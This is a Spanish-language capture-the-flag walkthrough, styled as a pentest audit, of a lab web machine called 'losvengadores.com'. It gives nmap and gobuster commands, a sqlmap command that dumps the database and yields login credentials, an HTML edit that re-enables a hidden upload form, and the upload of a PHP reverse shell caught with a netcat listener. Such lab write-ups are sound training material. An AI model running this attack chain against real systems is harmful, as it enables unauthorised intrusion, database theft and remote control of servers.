

- Resumen ejecutivo 3
- Resumen del proyecto 4
- Alcance de la auditoría 5
- Evaluación inicial 6
- Formalización del modelo de amenazas 11


Metodologías de penetración
-  Escaneo de red
	- Nmap 
	- Fuzzing de directorios Gobuster
-  Enumeración
	- burpsuite
	- sqlmap
- Explotación
	- Reverse shell

# ESCANEO DE RED 

### Nmap

```
sudo nmap -p- -open -sS -sV -Pn  --min-rate 5000 10.0.2.15 -vvv

```

![[Pasted image 20240605200324.png]]
Vemos 2 puertos el 22 y el 80 abiertos. ya sabemos que son el ssh y servidor web respectivamente.
	 ###### Nota 
	 para que la maquina funcione se debe introducir la IP en el archivo /etc/hosts 
		 ![[Pasted image 20240605200537.png]]
luego vamos a la ur los vengadores.com
	clic en buscador y hacemos click en el boton BUSCADOR que se ve en blanco
				![[Pasted image 20240605200833.png]]


### Gobuster
```
gobuster dir -u http://losvengadores.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
hay varias rutas pero para el reto no sirve ninguna...

![[Pasted image 20240605201712.png]]

vamos a la busqueda y probamos con los "heroes " que hay en el inicio.
![[Pasted image 20240605201943.png]]
significa que esta en la bd ahora interceptemos la peticion.
![[Pasted image 20240605202104.png]]
click derecho y copy to file y lo guardamos con un nombre y la extensión .req
### SQLMAP

Una vez exportado el archivo.req vomaos a usar sqlmap
```
sqlmap -r losvengadoress.req -p searchVal --batch --level 5 --risk 3   --dump -All --threads 10
```
lo que nos interesa es esta fila de la bd. ahora vamos a loguearnos a la web

![[Pasted image 20240605201017.png]]
vamos a login  y  ponemos de usuario capitanamerica y adamantium de password.
![[Pasted image 20240605202439.png]]
 una vez dentro  tenemos que borrar lo que pone en la url el panelControl.php hay que quitarlo 
 
 ![[Pasted image 20240605202730.png]]
de vuelta en la pag vamos a inspeccionar y buscamos CV Upload.
![[Pasted image 20240605202843.png]] 

ahora hay que editar el html con lo siguiente.

```
   
	<div class="col-sm-12 col-md-6">
              <form action="CV-upload.php" method="post" enctype="multipart/form-data">
                <input id="cv" name="cv" type="file" placeholder="Your CV" />
                <button class="btn tm-btn-submit" onclick="upload_cv()">Submit</button>
              </form>
            </div>
   

```
esto nos habilitara la forma de subir los archivos
![[Pasted image 20240605203303.png]]
### Reverse Shell

vamos a https://www.revshells.com/ y usamos una reverse.php
copiamos todo y lo metemos en un archivo llamado cv.php



		![[Pasted image 20240605203624.png]]
	subimos la reverse 
	![[Pasted image 20240605203926.png]]
	![[Pasted image 20240605203942.png]]
	ahora vamos a esa ruta pero antes ponemos un nc -nlvp 4444
![[Pasted image 20240605204120.png]]
![[Pasted image 20240605204100.png]]
fin 